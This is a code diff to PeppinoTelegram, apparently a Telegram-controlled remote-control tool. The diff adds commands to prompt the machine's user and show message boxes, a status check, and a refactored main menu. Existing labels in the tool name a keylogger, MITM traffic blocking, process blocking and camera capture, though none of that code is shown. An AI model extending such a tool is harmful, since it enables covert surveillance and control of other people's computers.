@@ -422,6 +422,7 @@ class PeppinoTelegram:
             Command("menu_mitm", self.menu_mitm, "Open MITM menu.", "menu", "🕵️‍♂️ MITM"),
             Command("menu_plugins", self.menu_plugins, "Open Plugins menu.", "menu", "🔌 Your Plugins"),
             Command("menu_utilities", self.menu_utilities, "Open Utilitiemenu", "menu", "🔧 Utility"),
+            Command("menu_user_interaction", self.menu_user_interaction, "Open Menu User Interaction", "menu", "👤 User Interaction"),
             Command("menu_duckyscript", self.menu_ducky, "Opens ducky quick keys.", "menu", "🦆 DuckyScript"),
             
             # 🛑 System & Shutdown
@@ -539,6 +540,10 @@ class PeppinoTelegram:
             Command("deletemessages", self.deleteallmessages, "Delete recent messages.", "messaging", "❌ Deletemessages"),
             Command("deleteallmessages", self.deleteallmessages, "Delete all messages.", "messaging", "🗑️ Deleteallmessages"),
 
+            # 👤 User Interaction
+            Command("ask", self.user_prompt, "Ask Something to the user using the machine", "user_interaction", "🗣️ Ask"),
+            Command("messagebox", self.message_box, "Show custom message box.", "user_interaction", "💬 Message Box"),
+
             # 🔒 Can't Open List
             Command("cantopenadd", self.cantopen, "Block process execution.", "cant_open", "🚫 Cantopenadd"),
             Command("cantopenremove", self.removefromcantopen, "Unblock process execution.", "cant_open", "❌ Cantopenremove"),
@@ -555,6 +560,7 @@ class PeppinoTelegram:
             Command("block_chrome", self.block_chrome, "Blocks traffic on chrome.", "mitm", "🚫 Block CHROME"),
 
             # 🔧 Utilities & Testing
+            Command("status", lambda: self.bsend("Hey! I'm online"), "Just checking if the bot is online.",  "utility", "Check Status"),
             Command("get_logs", self.get_logs, "Gets the program logs ins a file", "utility", "📄 Get Logs"),
             Command("stop", self.stop, "Stop current operation.", "utility", "🛑 Stop"),
             Command("test", self.test, "Run test routine.", "utility", "🧪 Test"),
@@ -1378,24 +1384,11 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
     def mainmenu(self):
         print("Opening main menu")
         buttons = {}
-        for category, label, submenu in [
-            ("🛑 System", "🛑 System & Shutdown", "/menu_system"),
-            ("🌐 Network", "🌐 Network & Remote Access", "/menu_network"),
-            ("📸 Camera", "📸 Camera & Screen", "/menu_camera"),
-            ("🔊 Audio", "🔊 Audio & Volume", "/menu_audio"),
-            ("🎵 Sound FX", "🎵 Sound Effects", "/menu_soundfx"),
-            ("😈 Pranks", "😈 Pranks & Visuals", "/menu_pranks"),
-            ("💻 System Control", "💻 System Control", "/menu_control"),
-            ("🎮 Input", "🎮 Input / Device Control", "/menu_input"),
-            ("📋 Messaging", "📋 Messaging", "/menu_messaging"),
-            ("🔒 Can't Open", "🔒 Can't Open List", "/menu_cantopen"),
-            ("🧠 Keylogger", "🧠 Keylogger", "/menu_keylogger"),
-            ("🦑 Misc", "🦑 Misc", "/menu_misc"),
-            ("🦆 DuckyScript", "🦆 DuckyScript", "/menu_duckyscript"),
-            ("🕵️‍♂️ Mitm", "🕵️‍♂️ Mitm", "/menu_mitm"),
-            ("🔌 PlugIns", "🔌 Your Plugins", "/menu_plugins"),
-            ("🔧 Utility","🔧 Utility", "/menu_utilities"),
-        ]:
+        for command in self.commands:
+            if not command.category=="menu":
+                continue
+            label = command.label
+            submenu = command.name
             buttons[label] = submenu
 
         if self.mainmenu_ref:
@@ -1452,6 +1445,10 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
     def menu_utilities(self):
         print("Opening utilities menu")
         return self.generate_category_menu("utility", "🔧 Utility")
+
+    def menu_user_interaction(self):
+        print("Opening user interaction menu")
+        return self.generate_category_menu("user_interaction", "👤 User Interaction")
 
     def menu_network(self):
         print("Opening network menu")
@@ -2652,6 +2649,22 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         ok, result = response_json.get("ok"), response_json.get("result")
         print(f"{'Commands updated' if ok else 'Commands NOT updated'}, Result: {result}")
         return response.status_code == 200
+
+    def user_prompt(self, question: str, title="Question") -> str:
+        msgid = self.bsendWithMarkdownV2(
+            f"🗣️ *Asking*\n"
+            f">> _{question}_"
+        )
+        res = user_prompt(question, title)
+        self.delete_message(msgid)
+        self.bsendWithMarkdownV2(
+            f"🗣️ *User Response*\n\n"
+            f"*You:* _{question}_\n"
+            f"*User:* _{res}_"
+        )
+
+        return res
+
 
     def waitforface(self, timeout=60):
         print(f"Waiting for face for {timeout} seconds")
